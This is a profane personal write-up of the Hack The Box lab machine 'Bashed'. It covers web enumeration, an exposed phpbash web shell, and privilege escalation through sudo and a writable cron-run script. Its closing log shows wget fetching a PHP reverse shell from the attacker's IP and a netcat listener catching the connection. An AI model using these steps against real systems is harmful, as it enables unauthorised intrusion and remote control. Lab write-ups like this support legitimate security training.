# HTB - Basher

---
## General Info
- OS: Linux
- Open ports: 80
- Running services: Apache:80(2.4.18)
- Endpoints:
	- /images
	- /css
	- /js
	- /uploads
	- /php
	- /dev
		- /phpbash
	- /fonts
- VHosts: -
- Auth: -
- Pwnd date: 07/05/2026. At 1:15 fucking am.

---
## Enumeration  

- Ran basic enumeration using nmap and ffuf: fuzzed vhosts, endpoints and found open ports.
- Opened webpage and found an interesting quote: 
> *"phpbash helps a lot with pentesting. I have tested it on multiple different servers and it was very useful. I actually developed it on this exact server!"*
- Which probably means that [phpbash](https://github.com/Arrexel/phpbash) is hosted somewhere in the webserver. 

---
## Exploitation  
 
- Found it under path /dev/phpbash.php
- I will create a reverse shell and upgrade it just to work more comfortably.
- Ok well I couldn't get a reverse shell. I can still work with this tho, so I'll just keep going.
- Got user flag. Starting PrivEsc

---
## PrivEsc

-  Did `sudo -l` (which checks what commands I can run as sudo or any other user), which gave me back
```bash
www-data@bashed
:/home# sudo -l

Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```
- Basically, what this means is that by using `sudo -u scriptmanager` I can run any command as them. 
- Found a script on /scripts that is writtable by scriptmanager and is executed by a cron job every 1 minute. 
- Got root flag lol. 
> Yes by making python read root flag and print it in an output file YES IT IS OBVIOUS.

---
## Rabbit holes

 - TRYING TO GET A MOTHERFUCKING DECENT SHELL WORKING.

---
## Attack chain

- Enumerate website and find /dev/phpbash.php
- Get user flag
- Run sudo -l and realize you can run commands as *scriptmanager*
- Find writtable script in /scripts, ran by sudo
- Find cron that runs the script every minute
- Tamper script to read root flag and output it in a file
- Get root flag.

---
## Learnt

- Don't be cocky and actually enumerate before spending 10 minutes trying to search a path on your own you dickhead.
- Frustration can sometimes blind you. Or make you go down rabit holes of trying to get a fucking RS

---
## Notes  

- Machine rating: Very easy
- I hate this machine with my whole soul.
  
  
#### I hate my life decisions

```bash
www-data@bashed :/var/www/html# ls -la 
total 116 
drw-r-xr-x 10 root root 4096 Jun 2 2022 . 
drwxr-xr-x 3 root root 4096 Jun 2 2022 .. 
-rw-r-xr-x 1 root root 8193 Dec 4 2017 about.html 
-rw-r-xr-x 1 root root 94 Dec 4 2017 config.php 
-rw-r-xr-x 1 root root 7805 Dec 4 2017 contact.html 
drw-r-xr-x 2 root root 4096 Jun 2 2022 css 
drw-r-xr-x 2 root root 4096 Jun 2 2022 demo-images 
drw-r-xr-x 2 root root 4096 Jun 2 2022 dev 
drw-r-xr-x 2 root root 4096 Jun 2 2022 fonts 
drw-r-xr-x 2 root root 4096 Jun 2 2022 images 
-rw-r-xr-x 1 root root 7743 Dec 4 2017 index.html 
drw-r-xr-x 2 root root 4096 Jun 2 2022 js 
drw-r-xr-x 2 root root 4096 Jun 2 2022 php 
-rw-r-xr-x 1 root root 10863 Dec 4 2017 scroll.html 
-rw-r-xr-x 1 root root 7477 Dec 4 2017 single.html 
-rw-r-xr-x 1 root root 24164 Dec 4 2017 style.css 
drwxrwxrwx 2 root root 4096 May 6 16:35 uploads 
www-data@bashed :/var/www/html/dev# cd .. 
www-data@bashed :/var/www/html# cd uploads 
www-data@bashed :/var/www/html/uploads# 
wget http://10.10.14.119:8080/php-reverse-shell.php 

--2026-05-06 16:35:20-- 
http://10.10.14.119:8080/php-reverse-shell.php 
Connecting to 10.10.14.119:8080... connected. HTTP request sent, awaiting response... 
200 OK Length: 5494 (5.4K) [application/octet-stream] Saving to: 'php-reverse-shell.php' 0K ..... 100% 24.0M=0s 2026-05-06 16:35:20 (24.0 MB/s) - 'php-reverse-shell.php' saved [5494/5494] 

┌─[eu-dedivip-5]─[10.10.14.119]─[lenadesp@htb-mi1waq7ngz]─[~/my_data/Machines/Basher] └──╼ [★]$ nc -lnvp 4444 
listening on [any] 4444 ... 
connect to [10.10.14.119] from (UNKNOWN) [10.129.31.135] 50638 Linux bashed 4.4.0-62-generic 
#83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 16:35:31 up 3 min, 0 users, load average: 0.01, 0.04, 0.01 
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT 
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
/bin/sh: 0: can't access tty; job control turned off 
$
```

do I even need to explain?